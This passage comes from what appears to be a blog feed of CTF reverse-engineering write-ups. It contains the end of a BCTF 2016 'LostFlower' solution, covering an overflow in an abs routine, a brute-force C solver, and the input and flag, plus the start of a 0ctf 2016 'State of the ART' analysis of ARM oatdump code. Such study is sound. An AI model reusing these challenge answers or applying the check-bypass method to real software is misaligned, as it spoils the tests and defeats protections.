class="keyword">goto</span> LABEL_28;</div><div class="line">                  &#125;</div><div class="line">                  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v2 &gt; <span class="number">-32671955</span> )</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                  <span class="keyword">if</span> ( v2 == (<span class="keyword">void</span> *)<span class="number">-109345566</span> )</div><div class="line">                  &#123;</div><div class="line">                    sub_7509FAA4(v17 - <span class="number">631823485</span> - v18 + <span class="number">631823485</span>);</div><div class="line">LABEL_28:</div><div class="line">                    v2 = (<span class="keyword">void</span> *)<span class="number">56101389</span>;</div><div class="line">                  &#125;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v2 &gt; <span class="number">32634615</span> )</div><div class="line">                  <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">if</span> ( v2 == (<span class="keyword">void</span> *)<span class="number">-32671954</span> )</div><div class="line">                &#123;</div><div class="line">                  v5 = j_j___aeabi_i2d(v3);</div><div class="line">                  v7 = j_j_pow_0(<span class="number">0</span>, <span class="number">1076101120</span>, v5, v6);</div><div class="line">                  v9 = j_j___aeabi_d2iz(v7, v8);</div><div class="line">                  v10 = j_j___aeabi_idiv(v17, v9);</div><div class="line">                  v11 = j_j___modsi3(v10, <span class="number">10</span>);</div><div class="line">                  v12 = my_pow(v11);</div><div class="line">                  v18 = -(-v18 - v12);</div><div class="line">                  v2 = (<span class="keyword">void</span> *)<span class="number">142850058</span>;</div><div class="line">                &#125;</div><div class="line">              &#125;</div><div class="line">              <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v2 &gt; <span class="number">56101388</span> )</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">...</div><div class="line"><span class="comment">// 第171行</span></div><div class="line"><span class="keyword">if</span> ( v2 == (<span class="keyword">void</span> *)<span class="number">32634616</span> )   <span class="comment">// 3）找到v2 = 32634616的地方。</span></div><div class="line">&#123;</div><div class="line">    v2 = (<span class="keyword">void</span> *)<span class="number">-427046904</span>;</div><div class="line">    v4 = <span class="number">-1611885754</span>;</div><div class="line">    <span class="keyword">if</span> ( !v29 ) <span class="comment">// v29要为1，不然就跳到LABEL_35去了，LABEL_35会改变v2的值。</span></div><div class="line">        <span class="keyword">goto</span> LABEL_35;</div><div class="line">&#125;</div><div class="line">...</div><div class="line"><span class="comment">// 第181行</span></div><div class="line"><span class="keyword">if</span> ( v2 == (<span class="keyword">void</span> *)<span class="number">56101389</span> )   <span class="comment">// 4）找到v2 = 56101389的地方，事实上不用在往前找了，这里就是判断的地方。</span></div><div class="line">&#123;</div><div class="line">    v13 = sub_7509FAA4((<span class="keyword">char</span> *)&amp;unk_59357062 + v17 - v18 - <span class="number">0x59357062</span>);</div><div class="line">    v14 = <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> ( v13 &gt;= <span class="number">0</span> ) <span class="comment">// v13需要小于0</span></div><div class="line">        v14 = <span class="number">0</span>;</div><div class="line">    v29 = v14;  <span class="comment">// 因为v29为1，因此v14要为1。</span></div><div class="line">    v2 = (<span class="keyword">void</span> *)<span class="number">32634616</span>;</div><div class="line">&#125;</div><div class="line">...</div><div class="line"><span class="comment">// 第212行</span></div><div class="line">  <span class="keyword">return</span> v1;    <span class="comment">// 1）这里是返回，也就是逆推入口，我们要找到对r1赋值为1的地方。</span></div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>从上面注释可以知道，也就是需要<code>sub_7509FAA4((char *)&amp;unk_59357062 + v17 - v18 - 0x59357062);</code>返回负数，现在我们需要做的就是搞清v17和v18的值是什么，以及<code>sub_7509FAA4</code>的逻辑。关键代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="comment">// 第33行</span></div><div class="line">v17 = a1;   <span class="comment">// a1为整数部分，也就是v17也为整数部分</span></div><div class="line">...</div><div class="line"><span class="comment">// 第73行</span></div><div class="line"><span class="keyword">if</span> ( v2 == &amp;unk_4A2AC114 )</div><div class="line">&#123;</div><div class="line">    v2 = (<span class="keyword">void</span> *)<span class="number">-32671954</span>;</div><div class="line">    v4 = <span class="number">-242797719</span>;</div><div class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="number">10</span> ) <span class="comment">// 这里是一个for循环的跳出条件</span></div><div class="line">LABEL_35:</div><div class="line">        v2 = (<span class="keyword">void</span> *)v4;</div><div class="line">&#125;</div><div class="line">...</div><div class="line"><span class="comment">// 第126行</span></div><div class="line"><span class="keyword">if</span> ( v2 == (<span class="keyword">void</span> *)<span class="number">-1521320686</span> )</div><div class="line">&#123;</div><div class="line">    ++v3;   <span class="comment">// for循环里的自增</span></div><div class="line">    v2 = (<span class="keyword">void</span> *)<span class="number">-1898177542</span>;</div><div class="line">&#125;</div><div class="line">...  </div><div class="line"><span class="comment">// 第157行</span></div><div class="line"><span class="keyword">if</span> ( v2 == (<span class="keyword">void</span> *)<span class="number">-32671954</span> )  <span class="comment">// 这里面是for循环的主体</span></div><div class="line">&#123;</div><div class="line">    v5 = j_j___aeabi_i2d(v3);</div><div class="line">    v7 = j_j_pow_0(<span class="number">0</span>, <span class="number">1076101120</span>, v5, v6);</div><div class="line">    v9 = j_j___aeabi_d2iz(v7, v8);</div><div class="line">    v10 = j_j___aeabi_idiv(v17, v9);</div><div class="line">    v11 = j_j___modsi3(v10, <span class="number">10</span>);</div><div class="line">    v12 = my_pow(v11);</div><div class="line">    v18 = -(-v18 - v12);</div><div class="line">    v2 = (<span class="keyword">void</span> *)<span class="number">142850058</span>;</div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>v17为用户输入的Double数据的整数部分，v18在for循环里完成了赋值，那么这个for循环到底干了什么？我们先看前面几行代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">v5 = j_j___aeabi_i2d(v3);</div><div class="line">v7 = j_j_pow_0(<span class="number">0</span>, <span class="number">1076101120</span>, v5, v6);</div><div class="line">v9 = j_j___aeabi_d2iz(v7, v8);</div><div class="line">v10 = j_j___aeabi_idiv(v17, v9);</div><div class="line">v11 = j_j___modsi3(v10, <span class="number">10</span>);</div></pre></td></tr></table></figure></p>
<p>这里几个函数都是一些除法、求余的操作。经过几轮动态调试，事实上，这个for循环的前五行代码就是逆向取出一个10位整数的每一位。举个例子，输入为1234567890，每一轮得到的依次为0，9，8，7，6，5，4，3，2，1。<br>现在还剩下一个<code>my_pow</code>,顾名思义这是个幂相关的函数。注意我们不需要去具体分析<code>my_pow</code>,因为我们的输入只有0-9这10种可能，几轮测试过后，得到结论：<code>my_pow</code>返回输入数据的十次幂。<br>用C代码重现下这个for循环：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> i;</div><div class="line"><span class="keyword">int</span> integer; <span class="comment">// 用户输入的整数部分</span></div><div class="line"><span class="keyword">int</span> out;    <span class="comment">// 即v12</span></div><div class="line"></div><div class="line">out = <span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</div><div class="line">    <span class="keyword">int</span> x;</div><div class="line">    </div><div class="line">    x = integer / <span class="built_in">pow</span>(<span class="number">10</span>, i) % <span class="number">10</span>;</div><div class="line">    out += pwo(x, <span class="number">10</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>ok，现在<code>sub_7509FAA4((char *)&amp;unk_59357062 + v17 - v18 - 0x59357062);</code>中，我们知道v17为用户输入数据的整数部分，v18为上面的out，剩下的是分析<code>sub_7509FAA4</code>的功能，f5得到伪代码，代码很短，而且逻辑也很简单，逻辑是这样的：如果参数（v17 - v18）为非负数直接返回该参数，如果参数为负数则求补之后返回。<br>这里遇到一个问题，由上面分析可知，需要<code>sub_7509FAA4</code>返回负数，但是按照该函数逻辑，无论如何都会返回一个非负数！什么情况？经过1个小时的重新分析，排除了前面分析错误的情况，那么<code>sub_7509FAA4</code>存在溢出？这个时候看伪代码已经没用了，通过对<code>sub_7509FAA4</code>的汇编代码的分析，发现了溢出点：<code>NEGS    R1, R1</code>，当参数为负数时，程序使用<code>NEGS</code>指令求补后返回，其中<code>NEGS</code>的作用是这样的：将目的操作数的所有数据位取反加1。当参数为0x80000000（这是个负数）时，所有数据位取反后为0x8fffffff，再加1后发生溢出，最后值为0x80000000。也就是说，0x80000000经过<code>NEGS</code>后仍然为0x80000000。<br>终上所述，现在给出结论：</p>
<ol>
<li>输入数据为一个合法的十位Double数据，设其整数部分为integer。</li>
<li>对integer的每一位求10次幂，并全部加起来，结果为sum。</li>
<li>integer -sum == 0x80000000。</li>
</ol>
<p>最后给出计算输入的程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> pow_table[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0x400</span>, <span class="number">0xe6a9</span>, <span class="number">0x100000</span>, <span class="number">0x9502f9</span>, <span class="number">0x39aa400</span>, <span class="number">0x10d63af1</span>, <span class="number">0x40000000</span>, <span class="number">0xcfd41b91</span>&#125;;</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line"></div><div class="line">	<span class="keyword">for</span> (i = <span class="number">1000000000</span>; i &lt;= <span class="number">0x80000000</span>; ++i) &#123;</div><div class="line">		<span class="keyword">int</span> a0 = i % <span class="number">10</span>;</div><div class="line">		<span class="keyword">int</span> a1 = (i % <span class="number">100</span>) / <span class="number">10</span>;</div><div class="line">		<span class="keyword">int</span> a2 = (i % <span class="number">1000</span>) / <span class="number">100</span>;</div><div class="line">		<span class="keyword">int</span> a3 = (i % <span class="number">10000</span>) / <span class="number">1000</span>;</div><div class="line">		<span class="keyword">int</span> a4 = (i % <span class="number">100000</span>) / <span class="number">10000</span>;</div><div class="line">		<span class="keyword">int</span> a5 = (i % <span class="number">1000000</span>) / <span class="number">100000</span>;</div><div class="line">		<span class="keyword">int</span> a6 = (i % <span class="number">10000000</span>) / <span class="number">1000000</span>;</div><div class="line">		<span class="keyword">int</span> a7 = (i % <span class="number">100000000</span>) / <span class="number">10000000</span>;</div><div class="line">		<span class="keyword">int</span> a8 = (i % <span class="number">1000000000</span>) / <span class="number">100000000</span>;</div><div class="line">		<span class="keyword">int</span> a9 = i / <span class="number">1000000000</span>;</div><div class="line">		</div><div class="line">		<span class="keyword">int</span> sum = pow_table[a0] + pow_table[a1] + pow_table[a2] + pow_table[a3] + pow_table[a4] + pow_table[a5] + pow_table[a6] + pow_table[a7] + pow_table[a8] + pow_table[a9];</div><div class="line">		<span class="keyword">if</span> (((i - sum) &amp; <span class="number">0xffffffff</span>) == <span class="number">0x80000000</span>) </div><div class="line">		&#123;</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"ok, %d\n"</span>, i);</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(i % <span class="number">1000000</span> == <span class="number">0</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>程序跑一会就出来了，输入为<code>1422445956</code>，最后的Flag为：<code>BCTF{wrhav3f4nwxo}</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2016年bctf中的LostFlower的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>0ctf 2016 State of the ART writeup</title>
    <link href="http://ele7enxxh.com/0ctf-2016-State-Of-The-ART-Writeup.html"/>
    <id>http://ele7enxxh.com/0ctf-2016-State-Of-The-ART-Writeup.html</id>
    <published>2016-03-22T18:44:00.000Z</published>
    <updated>2016-03-23T06:25:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文为2016年0ctf中的mobile题目State of the ART的writeup。<a id="more"></a></p>
<p><img src="/images/0ctf-2016-State-of-the-ART-writeup-1.png" alt="1"></p>
<h2 id="State-of-the-ART-writeup"><a href="#State-of-the-ART-writeup" class="headerlink" title="State of the ART writeup"></a>State of the ART writeup</h2><p>首先<a href="/downloads/0ctf-2016-State-of-the-ART.zip">点我</a>下载题目，这道题提供了三个文件，分别为：</p>
<blockquote>
<p>a：内存布局文件<br>b：oatdump的结果文件<br>c：boot.oat文件</p>
</blockquote>
<p>经过对几个文件的初步观察，发现在b文件中找到一个可疑函数<code>oat.sjl.gossip.oat.MainActivity.check(java.lang.String)</code>，函数名字可不会乱取，此函数肯定和Flag密切相关，因此需要还原出该方法。可惜，出题者有意抹去了oatdump中的dalvik字节码，不然这道题会简单的多。<br>我们分段分析汇编代码，首先看下面一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">0x00371e8c: b099        sub     sp, sp, #100</div><div class="line">0x00371e8e: 9000        str     r0, [sp, #0]</div><div class="line">0x00371e90: 9121        str     r1, [sp, #132]</div><div class="line">0x00371e92: 9222        str     r2, [sp, #136]</div><div class="line">0x00371e94: f8d9e11c    ldr.w   lr, [r9, #284]  ; pAllocArrayResolved</div><div class="line">0x00371e98: 9900        ldr     r1, [sp, #0]</div><div class="line">0x00371e9a: 2606        movs    r6, #6</div><div class="line">0x00371e9c: 1c32        mov     r2, r6</div><div class="line">0x00371e9e: f64e0020    movw    r0, #59424</div><div class="line">0x00371ea2: f2c7005b    movt    r0, #28763</div><div class="line">0x00371ea6: 47f0        blx     lr</div></pre></td></tr></table></figure></p>
<p>其中pAllocArrayResolved对应的是artAllocArrayFromCode函数，原型为：<br><code>extern &quot;C&quot; mirror::Array* artAllocArrayFromCode##suffix##suffix2(uint32_t type_idx, mirror::ArtMethod* method, int32_t component_count, Thread* self, StackReference&lt;mirror::ArtMethod&gt;* sp)</code><br>根据分析，其功能是创建数组，其包含3个参数，r0为创建对象的类型，r1为method对象，r2为待创建数组元素的个数，返回值存放在r0，返回类型为mirror::Array*。<br>下一段代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x00371ea8: f8d9e190    ldr.w   lr, [r9, #400]  ; pHandleFillArrayData</div><div class="line">0x00371eac: 4682        mov     r10, r0</div><div class="line">0x00371eae: 4650        mov     r0, r10</div><div class="line">0x00371eb0: f20f6144    adr     r1, +1604 (0x003724f8)</div><div class="line">0x00371eb4: 47f0        blx     lr</div></pre></td></tr></table></figure></p>
<p>其中pHandleFillArrayData对应的是artHandleFillArrayDataFromCode函数，原型为：<br><code>extern &quot;C&quot; int artHandleFillArrayDataFromCode(mirror::Array* array, const Instruction::ArrayDataPayload* payload, Thread* self, StackReference&lt;mirror::ArtMethod&gt;* sp)</code><br>根据分析，其功能是初始化数组，其包含2个参数，r0为待初始化的数组对象，也就是pAllocArrayResolved的返回值，r1指向赋值内容，其类型为Instruction::ArrayDataPayload*，对应的数据结构为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">struct</span> <span class="title">PACKED</span><span class="params">(<span class="number">4</span>)</span> ArrayDataPayload </span>&#123;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">uint16_t</span> ident;           <span class="comment">// 标志</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">uint16_t</span> element_width;   <span class="comment">// 每一个元素的大小</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> element_count;   <span class="comment">// 元素的个数</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span> data[];           <span class="comment">//指向真正的数据</span></div><div class="line">    ...</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>r1的值为0x003724f8，其对应的区域为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0x003724f8: 0300        lsls    r0, r0, #12</div><div class="line">0x003724fa: 0001        lsls    r1, r0, #0</div><div class="line">0x003724fc: 0006        lsls    r6, r0, #0</div><div class="line">0x003724fe: 0000        lsls    r0, r0, #0</div><div class="line">0x00372500: 4578        cmp     r0, pc</div><div class="line">0x00372502: 3278        adds    r2, #120</div><div class="line">0x00372504: 3757        adds    r7, #87</div><div class="line">0x00372506: 0000        lsls    r0, r0, #0</div></pre></td></tr></table></figure></p>
<p>ident为固定值，也就是0x0300，element_width为1,表示每一个元素的大小为1，也就是说这是一个byte数组，element_count为6，表示数组包含6个byte元素。同理后续几段汇编依次创建并初始化了5个byte数组。<br>上述汇编共创建并初始化了6个byte数组，对应的Java源码为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 每行的注释指的的是该数组对象的存放位置</span></div><div class="line"><span class="keyword">byte</span>[] s1 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x78</span>, <span class="number">0x45</span>, <span class="number">0x78</span>, <span class="number">0x32</span>, <span class="number">0x57</span>, <span class="number">0x37</span>&#125;;           <span class="comment">// r10</span></div><div class="line"><span class="keyword">byte</span>[] s2 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x22</span>, <span class="number">0x29</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x60</span>, <span class="number">0x33</span>&#125;;           <span class="comment">// r7</span></div><div class="line"><span class="keyword">byte</span>[] s3 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x17</span>, <span class="number">0x94</span>, <span class="number">0x35</span>, <span class="number">0x03</span>, <span class="number">0x90</span>&#125;;                 <span class="comment">// [sp, #56]</span></div><div class="line"><span class="keyword">byte</span>[] s4 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x45</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x41</span>,<span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x7d</span>&#125;;    <span class="comment">// [sp, #60]</span></div><div class="line"><span class="keyword">byte</span>[] s5 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x58</span>, <span class="number">0x75</span>, <span class="number">0x1b</span>, <span class="number">0xf0</span>, <span class="number">0x0f</span>, <span class="number">0x4c</span>&#125;;         <span class="comment">// r11</span></div><div class="line"><span class="keyword">byte</span>[] s6 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x69</span>, <span class="number">0x0c</span>, <span class="number">0x1b</span>, <span class="number">0xbe</span>, <span class="number">0xf2</span>, <span class="number">0x49</span>&#125;;         <span class="comment">//[sp, #52]</span></div></pre></td></tr></table></figure></p>
<p>再看下面一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">0x00371f60: 2500        movs    r5, #0</div><div class="line">0x00371f62: 68be        ldr     r6, [r7, #8]        // r7指向s2数组的mirror::Array对象，r6为s2数组包含的元素个数</div><div class="line">0x00371f64: 42b5        cmp     r5, r6</div><div class="line">0x00371f66: f2808034    bge.w   +104 (0x00371fd2)   // 这里就是一个for循环</div><div class="line">0x00371f6a: 68ba        ldr     r2, [r7, #8]</div><div class="line">0x00371f6c: f117030c    adds    r3, r7, #12</div><div class="line">0x00371f70: 4295        cmp     r5, r2</div><div class="line">0x00371f72: f0808248    bcs.w   +1168 (0x00372406)  // 对s2数组进行边界判断</div><div class="line">0x00371f76: 575e        ldrsb   r6, [r3, r5]        // r6 = s2[r5]，也就是取出s2数组的元素</div><div class="line">0x00371f78: 68b8        ldr     r0, [r7, #8]</div><div class="line">0x00371f7a: f1160636    adds    r6, r6, #54         // r6 = s2[r5] + 54</div><div class="line">0x00371f7e: f3460607    UNKNOWN 52                  // SBFX.W    R6, R6, #0, #8</div><div class="line">0x00371f82: f1170c0c    adds    r12, r7, #12</div><div class="line">0x00371f86: 4285        cmp     r5, r0</div><div class="line">0x00371f88: f0808242    bcs.w   +1156 (0x00372410)  // 对s2数组进行边界判断</div><div class="line">0x00371f8c: f80c6005    strb    r6, [r12, r5]</div><div class="line">0x00371f90: 68b9        ldr     r1, [r7, #8]</div><div class="line">0x00371f92: f117020c    adds    r2, r7, #12</div><div class="line">0x00371f96: 428d        cmp     r5, r1</div><div class="line">0x00371f98: f080823f    bcs.w   +1150 (0x0037241a)  // 对s2数组进行边界判断</div><div class="line">0x00371f9c: 5756        ldrsb   r6, [r2, r5]</div><div class="line">0x00371f9e: 9b0d        ldr     r3, [sp, #52]       // 取出s6数组的mirror::Array对象的首地址</div><div class="line">0x00371fa0: f8d3c008    ldr.w   r12, [r3, #8]</div><div class="line">0x00371fa4: f113000c    adds    r0, r3, #12         // 取出s6数组的mirror::Array对象中数据区域的首地址</div><div class="line">0x00371fa8: 4565        cmp     r5, r12</div><div class="line">0x00371faa: f080823a    bcs.w   +1140 (0x00372422)  // 对s6数组进行边界判断</div><div class="line">0x00371fae: f9108005    UNKNOWN 17                  // ldrsb.w    r8, [r0, r5]，也就是r8 = s6[r5]</div><div class="line">0x00371fb2: 68ba        ldr     r2, [r7, #8]</div><div class="line">0x00371fb4: ea860608    eor.w   r6, r6, r8          // r6 = (s2[r5] + 54) ^ s6[r5]</div><div class="line">0x00371fb8: f3460607    UNKNOWN 52                  // SBFX.W    R6, R6, #0, #8</div><div class="line">0x00371fbc: f117010c    adds    r1, r7, #12</div><div class="line">0x00371fc0: 4295        cmp     r5, r2</div><div class="line">0x00371fc2: f0808233    bcs.w   +1126 (0x0037242c)  // 对s2数组进行边界判断</div><div class="line">0x00371fc6: 554e        strb    r6, [r1, r5]        // s2[r5] = (s2[r5] + 54) ^ s6[r5]</div><div class="line">0x00371fc8: 1c6d        adds    r5, r5, #1          // r5 += 1</div><div class="line">0x00371fca: 3c01        subs    r4, #1</div><div class="line">0x00371fcc: f47fafc9    bne.w   -110 (0x00371f62)   // 循环，这里跳回去</div></pre></td></tr></table></figure></p>
<p>可以看到，上面汇编代码里含有大量的边界判断的跳转，这些应该是系统自动添加的一些处理，我们可以忽略掉。另外需要我们对mirror::Array类型有一定的了解。汇编代码中出现的UNKNOWN部分，应该是oatdump没有识别出这些指令，我们可以利用ida识别出来。这段对应的Java源码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for (int i = 0; i &lt; s2.length; ++i) &#123;</div><div class="line">    s2[i] = (byte) ((s2[i] + 54) ^ s6[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>继续下一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">0x00371fd2: 2500        movs    r5, #0</div><div class="line">0x00371fd4: f8da6008    ldr.w   r6, [r10, #8]</div><div class="line">0x00371fd8: 42b5        cmp     r5, r6</div><div class="line">0x00371fda: f2808051    bge.w   +162 (0x00372080)   // 这里就是一个for循环</div><div class="line">0x00371fde: f8da3008    ldr.w   r3, [r10, #8]</div><div class="line">0x00371fe2: f11a0c0c    adds    r12, r10, #12</div><div class="line">0x00371fe6: 429d        cmp     r5, r3</div><div class="line">0x00371fe8: f0808229    bcs.w   +1106 (0x0037243e)  // 对s1数组进行边界判断</div><div class="line">0x00371fec: f91c6005    UNKNOWN 17                  // ldrsb.w r6, [r12, r5]，也就是r6 = s1[r5]</div><div class="line">0x00371ff0: f04f0857    mov.w   r8, #87</div><div class="line">0x00371ff4: 4546        cmp     r6, r8              // s1[r5]和87比较</div><div class="line">0x00371ff6: f0408009    bne.w   +18 (0x0037200c)    // 如果不等则跳向0x0037200c，等于则跳向0x00371ffa</div><div class="line">0x00371ffa: f8da1008    ldr.w   r1, [r10, #8]</div><div class="line">0x00371ffe: 2669        movs    r6, #105            // r6 = 105</div><div class="line">0x00372000: f11a000c    adds    r0, r10, #12</div><div class="line">0x00372004: 428d        cmp     r5, r1</div><div class="line">0x00372006: f080821f    bcs.w   +1086 (0x00372448)  // 对s1数组进行边界判断</div><div class="line">0x0037200a: 5546        strb    r6, [r0, r5]        // s1[r5] = 105</div><div class="line">0x0037200c: f8da2008    ldr.w   r2, [r10, #8]</div><div class="line">0x00372010: f11a030c    adds    r3, r10, #12</div><div class="line">0x00372014: 4295        cmp     r5, r2</div><div class="line">0x00372016: f080821b    bcs.w   +1078 (0x00372450)  // 对s1数组进行边界判断</div><div class="line">0x0037201a: 575e        ldrsb   r6, [r3, r5]        // r6 = s1[r5]</div><div class="line">0x0037201c: f04f0832    mov.w   r8, #50</div><div class="line">0x00372020: 4546        cmp     r6, r8              // s1[r5]和50比较</div><div class="line">0x00372022: f040800b    bne.w   +22 (0x0037203c)    // 如果不等则跳向0x0037203c，等于则跳向0x00372026</div><div class="line">0x00372026: f8da0008    ldr.w   r0, [r10, #8]</div><div class="line">0x0037202a: f06f067b    mvn     r6, #123            // r6 = ~123</div><div class="line">0x0037202e: f11a0c0c    adds    r12, r10, #12</div><div class="line">0x00372032: 4285        cmp     r5, r0</div><div class="line">0x00372034: f0808211    bcs.w   +1058 (0x0037245a)  // 对s1数组进行边界判断</div><div class="line">0x00372038: f80c6005    strb    r6, [r12, r5]       // s1[r5] = ~123</div><div class="line">0x0037203c: f8da1008    ldr.w   r1, [r10, #8]</div><div class="line">0x00372040: f11a020c    adds    r2, r10, #12</div><div class="line">0x00372044: 428d        cmp     r5, r1</div><div class="line">0x00372046: f080820d    bcs.w   +1050 (0x00372464)  // 对s1数组进行边界判断</div><div class="line">0x0037204a: 5756        ldrsb   r6, [r2, r5]</div><div class="line">0x0037204c: f8db3008    ldr.w   r3, [r11, #8]</div><div class="line">0x00372050: f11b0c0c    adds    r12, r11, #12</div><div class="line">0x00372054: 429d        